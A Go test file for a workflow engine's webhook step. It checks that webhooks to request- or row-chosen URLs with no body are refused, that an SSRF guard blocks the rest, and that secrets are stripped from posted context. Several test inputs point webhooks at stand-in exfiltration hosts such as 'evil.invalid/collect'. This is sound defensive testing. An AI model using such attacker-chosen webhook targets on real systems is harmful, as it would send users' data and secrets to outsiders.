//go:build !cli

package main

import (
	"net/http/httptest"
	"strings"
	"testing"
)

// `run: webhook` with no body posts the whole flow context (request fields,
// every step's output, env-derived values). That default stays for a URL the
// author fixed, but a request- or row-chosen URL must say what it sends.
// The hosts are unresolvable, so a step that gets past the body check stops
// at the SSRF guard instead of reaching the network.
func TestWebhookEmptyBodyRefusedForRequestChosenURL(t *testing.T) {
	app := secretTaintApp(t)
	run := func(url, body, query string) error {
		t.Helper()
		flow := Flow{Name: "hook", Trigger: FlowTrigger{Type: "http", Method: "GET", Path: "/api/hook"}, Steps: []FlowStep{
			{Name: "secret", Type: "sql", SQL: "SELECT 'internal' AS note"},
			{Type: "webhook", Webhook: url, WebhookBody: body},
			{Type: "respond", Respond: &FlowRespond{Status: 200, Body: "ok"}},
		}}
		return executeFlowHTTP(app, &flow, httptest.NewRecorder(), httptest.NewRequest("GET", "/api/hook"+query, nil))
	}
	for name, c := range map[string]struct{ url, body string }{
		"whole url":          {"{{target}}", ""},
		"path segment":       {"https://hooks.invalid/services/{{target}}", ""},
		"body renders empty": {"{{target}}", "{{ missing | default:'' }}"},
	} {
		err := run(c.url, c.body, "?target=https%3A%2F%2Fevil.invalid%2Fcollect")
		if err == nil || !strings.Contains(err.Error(), "must set `body:`") {
			t.Errorf("%s: want the empty-body refusal, got %v", name, err)
		}
	}
	// A fixed URL keeps the whole-context default, and an explicit body to a
	// request-chosen URL is unchanged: both reach the SSRF guard.
	if err := run("https://hooks.invalid/notify", "", "?target=x"); err == nil || !strings.Contains(err.Error(), "blocked webhook") {
		t.Fatalf("fixed URL with no body: got %v", err)
	}
	if err := run("{{target}}", `{"ok":true}`, "?target=https%3A%2F%2Fevil.invalid%2Fcollect"); err == nil || !strings.Contains(err.Error(), "blocked webhook") {
		t.Fatalf("request URL with a body: got %v", err)
	}

	// A data-event flow's row columns are client-written: a row-chosen URL
	// with no body is refused the same way.
	var got error
	event := Flow{Name: "on-insert", Trigger: FlowTrigger{Type: "on_insert", Table: "hooks"}, Steps: []FlowStep{
		{Type: "webhook", Webhook: "{{hook_url}}"},
	}}
	runFlowEventWith(app, event, map[string]any{"id": 1, "hook_url": "https://evil.invalid/x", "api_token": "t"}, func(ctx *FlowContext) { got = ctx.Error })
	if got == nil || !strings.Contains(got.Error(), "must set `body:`") {
		t.Fatalf("event flow: want the empty-body refusal, got %v", got)
	}
}

// Notify Hub-style service flows let their admin caller name a delivery
// callback and (because `payload:` is not a webhook key) post the whole
// context there. A global admin acting as itself (session or API token)
// keeps that, minus env-derived values; impersonated and act-as admin
// sessions and non-admins are refused.
func TestWebhookEmptyBodyToRequestURLAllowedForDirectAdmin(t *testing.T) {
	app := secretTaintApp(t)
	run := func(s *Session) error {
		t.Helper()
		ctx := &FlowContext{App: app, Session: s, Data: map[string]any{"target": "https://evil.invalid/cb"}, Params: map[string]string{"target": "https://evil.invalid/cb"}, RequestKeys: map[string]bool{"target": true}}
		return executeStep(ctx, &FlowStep{Type: "webhook", Webhook: "{{target}}"})
	}
	for name, s := range map[string]*Session{
		"admin session":      {UserID: 1, Role: "admin"},
		"scoped admin token": {UserID: 1, Role: "admin", CredentialScopes: "flows:call"},
	} {
		if err := run(s); err == nil || !strings.Contains(err.Error(), "blocked webhook") {
			t.Fatalf("%s: want to pass the body check and stop at the SSRF guard, got %v", name, err)
		}
	}
	for name, s := range map[string]*Session{
		"user":         {UserID: 2, Role: "user"},
		"impersonated": {UserID: 1, Role: "admin", ImpersonatorUserID: 9},
		"act-as":       {UserID: 1, Role: "admin", ActingAsGroup: "7"},
		"no session":   nil,
	} {
		if err := run(s); err == nil || !strings.Contains(err.Error(), "must set `body:`") {
			t.Errorf("%s: want the empty-body refusal, got %v", name, err)
		}
	}
	ctx := &FlowContext{Data: map[string]any{"to": "a@b.c", "cfg": map[string]any{"key": "s3cret", "region": "us"}, "tok": "s3cret"},
		SecretKeys: map[string]bool{"tok": true, "cfg.key": true}}
	got := ctx.dataWithoutSecrets()
	if _, ok := got["tok"]; ok {
		t.Fatal("env-derived step output was posted")
	}
	if cfg := got["cfg"].(map[string]any); cfg["key"] != nil || cfg["region"] != "us" || got["to"] != "a@b.c" {
		t.Fatalf("context without secrets = %v", got)
	}
}
